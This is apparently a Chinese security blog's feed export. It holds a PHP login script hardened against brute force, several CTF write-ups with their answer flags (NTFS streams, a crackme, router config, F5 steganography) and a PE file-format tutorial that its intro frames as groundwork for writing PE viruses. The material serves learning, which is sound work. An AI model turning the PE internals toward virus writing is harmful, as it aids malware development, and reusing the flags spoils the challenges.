class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR);</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://blog.csdn.net/qq_44105778/article/details/88319572">https://blog.csdn.net/qq_44105778/article/details/88319572</a><br><a href="https://www.cnblogs.com/pangsong/p/12194227.html">https://www.cnblogs.com/pangsong/p/12194227.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU刷题日记_[ACTF新生赛2020]NTFS数据流1</title>
    <link href="https://blog.pillar.fun/2020/04/01/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-NTFS%E6%95%B0%E6%8D%AE%E6%B5%811/"/>
    <id>https://blog.pillar.fun/2020/04/01/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-NTFS%E6%95%B0%E6%8D%AE%E6%B5%811/</id>
    <published>2020-04-01T02:31:24.000Z</published>
    <updated>2022-02-23T10:14:26.430Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="ACTF新生赛2020-NTFS数据流1"><a href="#ACTF新生赛2020-NTFS数据流1" class="headerlink" title="[ACTF新生赛2020]NTFS数据流1"></a>[ACTF新生赛2020]NTFS数据流1</h1><p>知识点在于NTFS数据流，搜一下可以知道</p><p><a href="https://www.qingsword.com/qing/812.html">https://www.qingsword.com/qing/812.html</a></p><p>于是用lads查看一下。</p><p><img src="/2020/04/01/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-NTFS%E6%95%B0%E6%8D%AE%E6%B5%811/1.jpg" alt="img"></p><p>可以看到293.txt有NTFS数据流</p><p>于是开之。</p><p><img src="/2020/04/01/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-NTFS%E6%95%B0%E6%8D%AE%E6%B5%811/2.jpg" alt="img"></p><p>ACTF{AAAds_nntfs_ffunn?}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记_Mysterious</title>
    <link href="https://blog.pillar.fun/2020/03/28/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Mysterious/"/>
    <id>https://blog.pillar.fun/2020/03/28/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Mysterious/</id>
    <published>2020-03-28T01:57:36.000Z</published>
    <updated>2022-02-23T02:32:14.984Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记（虽然但是，为什么他在misc的题里捏？）</p><h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>题目是一个exe，提示逆向，打开看看先。</p><p><img src="/2020/03/28/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Mysterious/1.jpg" alt="img"></p><p>看起来像是一个经典的猜词，用ida打开，用shift+F12查看字符</p><p><img src="/2020/03/28/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Mysterious/2.jpg" alt="img"></p><p>看到一个Buff3r_0v3rf|0w，但是提交发现并不是flag，于是追到welldone那里看看。</p><p><img src="/2020/03/28/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Mysterious/3.jpg" alt="img"></p><p>于是去sub_401090看看，F5反汇编。</p><p><img src="/2020/03/28/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Mysterious/4.jpg" alt="img"></p><p>可以看出，flag是 flag{source_Buff3r_0v3rf|0w)，而source来自value，而value来自v4，而v4来自string，而string来自我们输入的内容。并且我们输入的内容要长度小于等于6，而且输入内容满足</p><p><img src="/2020/03/28/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Mysterious/5.jpg" alt="img"></p><p>即string的第3、4、5位应该分别为ascii为120、121、122的三个字符，即xyz。同时v4，v4也来源于我们的输入，是atoi（string）的结果，所以我们的前三个字符要为122，即我们要输入122xyz</p><p><img src="/2020/03/28/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Mysterious/6.jpg" alt="img"></p><p>flag{123_Buff3r_0v3rf|0w}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="re" scheme="https://blog.pillar.fun/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记_荷兰宽带数据泄露</title>
    <link href="https://blog.pillar.fun/2020/03/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E8%8D%B7%E5%85%B0%E5%AE%BD%E5%B8%A6%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/"/>
    <id>https://blog.pillar.fun/2020/03/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E8%8D%B7%E5%85%B0%E5%AE%BD%E5%B8%A6%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/</id>
    <published>2020-03-27T11:49:48.000Z</published>
    <updated>2022-02-23T04:54:21.798Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h1><p>题目是一个.bin加上题目是宽带数据泄露，不禁让人想到是路由器信息数据。用RouterPassView查看</p><p><img src="/2020/03/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E8%8D%B7%E5%85%B0%E5%AE%BD%E5%B8%A6%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/1.jpg" alt="img"></p><p>路由信息数据可能藏的也就username和password，挨个试，发现是username（为什么username不设个flag{}这样的捏？是因会加密咩？）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记_刷新的图片</title>
    <link href="https://blog.pillar.fun/2020/03/20/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%88%B7%E6%96%B0%E7%9A%84%E5%9B%BE%E7%89%87/"/>
    <id>https://blog.pillar.fun/2020/03/20/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%88%B7%E6%96%B0%E7%9A%84%E5%9B%BE%E7%89%87/</id>
    <published>2020-03-20T08:46:21.000Z</published>
    <updated>2022-02-21T11:50:33.501Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h1><p>题目是一张图片，结合题目，联想到F5隐写</p><h2 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h2><p>F5隐写采用了矩阵编码来提高隐写效率。具体可以看<a href="https://link.springer.com/chapter/10.1007/3-540-45496-9_21?noAccess=true" title="F5—A Steganographic Algorithm">这篇论文</a></p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>使用<a href="https://github.com/matthewgao/F5-steganography">F5-steganography</a>工具即可。</p><p><img src="/2020/03/20/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%88%B7%E6%96%B0%E7%9A%84%E5%9B%BE%E7%89%87/1.jpg" alt="img"></p><p>打开output.txt，是16进制的，因此使用010editor看看，发现PK的文件头，改为zip，即得flag</p><p><img src="/2020/03/20/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%88%B7%E6%96%B0%E7%9A%84%E5%9B%BE%E7%89%87/2.jpg" alt="img"></p><p><img src="/2020/03/20/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%88%B7%E6%96%B0%E7%9A%84%E5%9B%BE%E7%89%87/3.jpg" alt="img"></p><p>flag{96efd0a2037d06f34199e921079778ee}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>PE格式</title>
    <link href="https://blog.pillar.fun/2020/03/19/PE%E6%A0%BC%E5%BC%8F/"/>
    <id>https://blog.pillar.fun/2020/03/19/PE%E6%A0%BC%E5%BC%8F/</id>
    <published>2020-03-19T05:58:39.000Z</published>
    <updated>2021-03-24T05:00:17.982Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>如果你想学习PE病毒的编写，那么你首先得知道PE的格式和他的工作原理。</p><a id="more"></a><h1 id="PE的百度百科"><a href="#PE的百度百科" class="headerlink" title="PE的百度百科"></a>PE的百度百科</h1><p>PE(Protable Executable),即可移植的执行体。在Windows操作系统平台下，所有的可执行文件如EXE文件、DLL文件、SYS文件、OCX文件、COM文件等均使用PE结构。</p><h1 id="PE文件的结构"><a href="#PE文件的结构" class="headerlink" title="PE文件的结构"></a>PE文件的结构</h1><p>一张简简单单的图送给各位<br><img src="/2020/03/19/PE%E6%A0%BC%E5%BC%8F/1.jpg" alt><br>还有一个比较详细的pdf送给各位<br>链接：<a href="https://pan.baidu.com/s/1SGU2AUQvzoHU9Foxx1-UYQ">https://pan.baidu.com/s/1SGU2AUQvzoHU9Foxx1-UYQ</a> 提取码：ckdi </p><h2 id="MS-DOS（DOS头）-MZ文件头-DOS-Stub"><a href="#MS-DOS（DOS头）-MZ文件头-DOS-Stub" class="headerlink" title="MS-DOS（DOS头）=MZ文件头+DOS Stub"></a>MS-DOS（DOS头）=MZ文件头+DOS Stub</h2><p>DOS头的作用是定位文件PE头的开始位置，也可用于PE文件的合法性检查。而在DOS下运行时则会提示用户本文件不能在DOS下运行。在C语言的Windows.h中有预定义的数据结构IMAGE_DOS_HEADER如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      &#x2F;&#x2F; DOS .EXE header</span><br><span class="line">    WORD   e_magic;                     &#x2F;&#x2F; Magic number</span><br><span class="line">    WORD   e_cblp;                      &#x2F;&#x2F; Bytes on last page of file</span><br><span class="line">    WORD   e_cp;                        &#x2F;&#x2F; Pages in file</span><br><span class="line">    WORD   e_crlc;                      &#x2F;&#x2F; Relocations</span><br><span class="line">    WORD   e_cparhdr;                   &#x2F;&#x2F; Size of header in paragraphs</span><br><span class="line">    WORD   e_minalloc;                  &#x2F;&#x2F; Minimum extra paragraphs needed</span><br><span class="line">    WORD   e_maxalloc;                  &#x2F;&#x2F; Maximum extra paragraphs needed</span><br><span class="line">    WORD   e_ss;                        &#x2F;&#x2F; Initial (relative) SS value</span><br><span class="line">    WORD   e_sp;                        &#x2F;&#x2F; Initial SP value</span><br><span class="line">    WORD   e_csum;                      &#x2F;&#x2F; Checksum</span><br><span class="line">    WORD   e_ip;                        &#x2F;&#x2F; Initial IP value</span><br><span class="line">    WORD   e_cs;                        &#x2F;&#x2F; Initial (relative) CS value</span><br><span class="line">    WORD   e_lfarlc;                    &#x2F;&#x2F; File address of relocation table</span><br><span class="line">    WORD   e_ovno;                      &#x2F;&#x2F; Overlay number</span><br><span class="line">    WORD   e_res[4];                    &#x2F;&#x2F; Reserved words</span><br><span class="line">    WORD   e_oemid;                     &#x2F;&#x2F; OEM identifier (for e_oeminfo)</span><br><span class="line">    WORD   e_oeminfo;                   &#x2F;&#x2F; OEM information; e_oemid specific</span><br><span class="line">    WORD   e_ress2[10];                  &#x2F;&#x2F; Reserved words</span><br><span class="line">    LONG   e_lfanew;                    &#x2F;&#x2F; File address of new exe header</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><h3 id="MZ文件头"><a href="#MZ文件头" class="headerlink" title="MZ文件头"></a>MZ文件头</h3><p>MZ文件头是真正意义的DOS头，其中包含了以下文件信息<br><img src="/2020/03/19/PE%E6%A0%BC%E5%BC%8F/2.jpg" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      &#x2F;&#x2F; DOS .EXE header</span><br><span class="line">    WORD   e_magic;                     &#x2F;&#x2F; Magic number</span><br><span class="line">    WORD   e_cblp;                      &#x2F;&#x2F; Bytes on last page of file</span><br><span class="line">    WORD   e_cp;                        &#x2F;&#x2F; Pages in file</span><br><span class="line">    WORD   e_crlc;                      &#x2F;&#x2F; Relocations</span><br><span class="line">    WORD   e_cparhdr;                   &#x2F;&#x2F; Size of header in paragraphs</span><br><span class="line">    WORD   e_minalloc;                  &#x2F;&#x2F; Minimum extra paragraphs needed</span><br><span class="line">    WORD   e_maxalloc;                  &#x2F;&#x2F; Maximum extra paragraphs needed</span><br><span class="line">    WORD   e_ss;                        &#x2F;&#x2F; Initial (relative) SS value</span><br><span class="line">    WORD   e_sp;                        &#x2F;&#x2F; Initial SP value</span><br><span class="line">    WORD   e_csum;                      &#x2F;&#x2F; Checksum</span><br><span class="line">    WORD   e_ip;                        &#x2F;&#x2F; Initial IP value</span><br><span class="line">    WORD   e_cs;                        &#x2F;&#x2F; Initial (relative) CS value</span><br><span class="line">    WORD   e_lfarlc;                    &#x2F;&#x2F; File address of relocation table</span><br><span class="line">    WORD   e_ovno;                      &#x2F;&#x2F; Overlay number</span><br><span class="line">    WORD   e_res[4];                    &#x2F;&#x2F; Reserved words</span><br><span class="line">    WORD   e_oemid;                     &#x2F;&#x2F; OEM identifier (for e_oeminfo)</span><br><span class="line">    WORD   e_oeminfo;                   &#x2F;&#x2F; OEM information; e_oemid specific</span><br><span class="line">    WORD   e_res2[10];                  &#x2F;&#x2F; Reserved words</span><br><span class="line">    LONG   e_lfanew;                    &#x2F;&#x2F; File address of new exe header</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><h3 id="DOS-Stub"><a href="#DOS-Stub" class="headerlink" title="DOS Stub"></a>DOS Stub</h3><p>DOS Stub主要是为了兼容DOS操作系统，目的是当这个文件在MS-DOS上运行时提示一段文字，大部分情况下是：This program cannot be run in DOS mode。</p><h2 id="PE-header"><a href="#PE-header" class="headerlink" title="PE header"></a>PE header</h2><p>PEheader是PE相关结构NT映像头（IMAGE_NT_HEADER）的简称，其中包含许多PE装载器用到的重要字段。<br>同样的我们看看C语言中对IMAGE_NT_HEADER的预定义(我们先只研究32位下的咯)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line"></span><br><span class="line">#ifdef _WIN64</span><br><span class="line">typedef IMAGE_NT_HEADERS64                  IMAGE_NT_HEADERS;</span><br><span class="line">typedef PIMAGE_NT_HEADERS64                 PIMAGE_NT_HEADERS;</span><br><span class="line">#else</span><br><span class="line">typedef IMAGE_NT_HEADERS32                  IMAGE_NT_HEADERS;</span><br><span class="line">typedef PIMAGE_NT_HEADERS32                 PIMAGE_NT_HEADERS;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><h3 id="提示字串（signature）"><a href="#提示字串（signature）" class="headerlink" title="提示字串（signature）"></a>提示字串（signature）</h3><p>这儿就是一个DWORD，内容是50h,45h,00h,00h,也就是ascii的PE空格空格</p><p>###映像文件头（FileHeader）<br>包含了PE文件物理分布信息，比如节数目、后续可选文件头大小、及其类型等等<br>定义如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/PE%E6%A0%BC%E5%BC%8F/3.jpg" alt></p><p>###可选文件头（OptionalHeader）<br>定义了PE文件许多的关键信息，入内存镜像加载地址、程序入口点、节在文件和内存中的对齐粒度、程序在内存中的镜像大小、文件大小等等。定义如下<span id="jump"></span></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; Standard fields.</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; NT additional fields.</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p><strong>ImageBase</strong>：PE文件在内存中安装在地址<br><strong>RVA地址</strong>：Relative Virtual Address，相虚拟地址，他是相对于ImageBase的偏移位置。<br><strong>对齐粒度</strong>：文件中节的对齐粒度就是文件一个节的长度，内存中节的对齐粒度就是内存中一个节的长度。<br>在磁盘中就按照文件的对齐粒度IMAGE_OPTIONAL_HEADER.FileAlignment对齐，在装载到内存中去运行的时候就按照内存中的节的对齐粒度IMAGE_OPTIONAL_HEADER.SectionAlignment对齐。<br>常见情况下内存的对齐粒度是0x1000，而文件的对齐粒度是0x200，这样做是为了与磁盘的扇区大小和内存单元的大小对齐。</p><h3 id="可选文件头中比较重要的关键字"><a href="#可选文件头中比较重要的关键字" class="headerlink" title="可选文件头中比较重要的关键字"></a>可选文件头中比较重要的关键字</h3><p>如图<br><img src="/2020/03/19/PE%E6%A0%BC%E5%BC%8F/4.jpg" alt></p><h4 id="输入表"><a href="#输入表" class="headerlink" title="输入表"></a>输入表</h4><p>输入表是记录PE输入函数相关信息的一张表，他记录了PE文件在运行过程中调用动态链接库的一些函数的名称和地址。输入表分为输入名称表（INT）和输入地址表（IAT）。</p><p>在<a href="#jump">之前</a>的IMAGE_OPTIONAL_HEADER那里可以看到有一个IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]的内容,他的数据结构如下，就是简单地偏移量和大小的数据分块，一共分了16块，每一块都有对应的内容。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>IMAGE_NUMBEROF_DIRECTORY_ENTRIES为2的data directory内装的是一个叫做IMAGE_IMPORT_DESCRIPTOR的数据结构（IID）， </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        DWORD   Characteristics;            &#x2F;&#x2F; 0 for terminating null import descriptor</span><br><span class="line">        DWORD   OriginalFirstThunk;         &#x2F;&#x2F; RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  &#x2F;&#x2F; 0 if not bound,</span><br><span class="line">                                            &#x2F;&#x2F; -1 if bound, and real date\time stamp</span><br><span class="line">                                            &#x2F;&#x2F;     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br><span class="line">                                            &#x2F;&#x2F; O.W. date&#x2F;time stamp of DLL bound to (Old BIND)</span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 &#x2F;&#x2F; -1 if no forwarders</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     &#x2F;&#x2F; RVA to IAT (if bound this IAT has actual addresses)</span><br><span class="line">&#125; 